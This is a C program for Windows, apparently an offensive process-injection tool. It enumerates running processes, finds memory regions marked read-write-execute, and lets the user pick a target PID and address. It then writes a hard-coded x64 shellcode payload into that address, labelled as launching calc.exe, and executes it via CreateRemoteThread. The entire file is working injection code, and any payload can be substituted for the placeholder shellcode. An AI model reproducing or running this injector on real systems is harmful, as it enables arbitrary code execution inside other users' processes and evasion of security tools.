#include <stdio.h>
#include <windows.h>
#include <psapi.h>
#include <stdint.h>


BYTE shellcodeArray[] = { // Shellcode for calc
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50,
    0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52,
    0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a,
    0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41,
    0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
    0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40,
    0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
    0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
    0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
    0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c,
    0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
    0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a,
    0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b,
    0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
    0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd,
    0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
    0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff,
    0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
};

void injectShellcode(DWORD usersChoice, INT shellcodeArraySize, void * memoryRegion) {
    HANDLE hProcess;
    PBYTE pShellcode = shellcodeArray;
    SIZE_T numOfBytesWritten;

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, usersChoice);
    if (!WriteProcessMemory(hProcess, memoryRegion, pShellcode, shellcodeArraySize, & numOfBytesWritten)) {
        printf("(-) Failed to write shellcode to allotted memory address. Error: %d", GetLastError());
        CloseHandle(hProcess);
        return;
    }

    printf("(+) Number of Bytes written: %d\n", numOfBytesWritten);

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) memoryRegion, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("(-) Failed to create remote thread. Error: %lu\n", GetLastError());
    } else {
        printf("(+) Thread created, waiting for execution...\n");
        WaitForSingleObject(hThread, INFINITE);
        printf("(+) Shellcode execution completed.\n");
    }

    printf("(+) Finished");
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return;
}

typedef struct {
    DWORD pid;
    void * addresses[1024];
    int count;
}
ProcessMemoryInfo;

ProcessMemoryInfo processesWithRWX[2048];
int processCount = 0;

DWORD findRWXmemoryLocations() {
    DWORD PIDarray[2048];
    DWORD totalPIDsize = {
        0
    };
    DWORD numOfProcesses;

    for (int C = 0; C < 2048; C++) {
        processesWithRWX[C].count = 0;
    }

    if (!EnumProcesses(OUT PIDarray, sizeof(PIDarray), OUT & totalPIDsize)) {
        printf("EnumProcess failed. Error: %d", GetLastError());
        return FALSE;
    };

    numOfProcesses = totalPIDsize / sizeof(DWORD);
    printf("Number of Processes detected: %u\n", numOfProcesses);

    HANDLE hProcess;
    HMODULE moduleHandleArray[2048];
    DWORD moduleHandleSize;
    char moduleBaseName[512];

    for (int i = 0; i < numOfProcesses; i++) {
        if (PIDarray[i] != 0) {
            hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, PIDarray[i]);
            if (hProcess == NULL) {
                continue;
            };

            MEMORY_BASIC_INFORMATION mbi;
            uintptr_t address = 0;

            if (EnumProcessModules(IN hProcess, OUT moduleHandleArray, IN sizeof(moduleHandleArray), OUT & moduleHandleSize)) {
                if (GetModuleBaseName(IN hProcess, IN moduleHandleArray[0], OUT moduleBaseName, IN sizeof(moduleBaseName))) {
                    while (VirtualQueryEx(IN hProcess, IN(LPCVOID) address, OUT & mbi, IN sizeof(mbi)) != 0) {
                        if (mbi.State == MEM_COMMIT && (mbi.Protect & PAGE_EXECUTE_READWRITE) == PAGE_EXECUTE_READWRITE) {
                            int index = -1;
                            for (int j = 0; j < processCount; j++) {
                                if (processesWithRWX[j].pid == PIDarray[i]) {
                                    index = j;
                                    break;
                                }
                            }

                            if (index == -1) {
                                index = processCount++;
                                processesWithRWX[index].pid = PIDarray[i];
                                processesWithRWX[index].count = 0;
                            }
                            processesWithRWX[index].addresses[processesWithRWX[index].count++] = (void * ) mbi.BaseAddress;

                            printf("(+) Process \"%s\" (PID: %d) has RWX memory permissions at address 0x%p. Size: %zu Bytes\n", moduleBaseName, PIDarray[i], mbi.BaseAddress, mbi.RegionSize);
                        }
                        address = (uintptr_t) mbi.BaseAddress + mbi.RegionSize;
                    }
                } else {
                    printf("GetModuleBaseName failed at PID %d. Error: %d\n", PIDarray[i], GetLastError());
                }
            } else {
                printf("EnumProcessModules failed. Error: %d\n", GetLastError());
            }
            CloseHandle(hProcess);
        };
    };

    if (processCount == 0) {
        printf("No PID's with RWX memory found.");
        return -1;
    }

    DWORD pidChoice;
    int validInput;

    do {
        printf("\n(+) Insert the PID you want to inject the shellcode into: ");
        validInput = scanf("%u", & pidChoice);
        if (validInput != 1) {
            printf("(-) Invalid input. Please enter a valid PID.\n");
            int c;
            while ((c = getchar()) != '\n' && c != EOF) {}
        }
    } while (validInput != 1);

    printf("(+) Checking to see what memory addresses PID %u has available..\n", pidChoice);
    int found = 0;
    for (int loop = 0; loop < processCount; loop++) {
        if (pidChoice == processesWithRWX[loop].pid) {
            found = 1;
            printf("\n(+) Size of your payload: %d Bytes\n", sizeof(shellcodeArray));
            printf("(+) PID %u has these memory addresses available:\n\t\t", pidChoice);
            for (int j = 0; j < processesWithRWX[loop].count; j++) {
                printf("Address %d: 0x%p\n\t\t", j + 1, processesWithRWX[loop].addresses[j]);
            }

            DWORD addressChoice;
            printf("\nEnter which address number you'd like to proceed with (Ex: 3):\t");
            scanf("%u", & addressChoice);
            void * selectedAddress = processesWithRWX[loop].addresses[addressChoice - 1];

            size_t sShellcodeArraySize = sizeof(shellcodeArray);
            if (!found) {
                printf("No PID's returned any memory allocations that contain RWX memory allocations");
                return -1;
            } else {
                injectShellcode(pidChoice, sShellcodeArraySize, selectedAddress);
            }
            break;
        }
    }

    return 0;
}

int main() {

    findRWXmemoryLocations();

    return 0;
}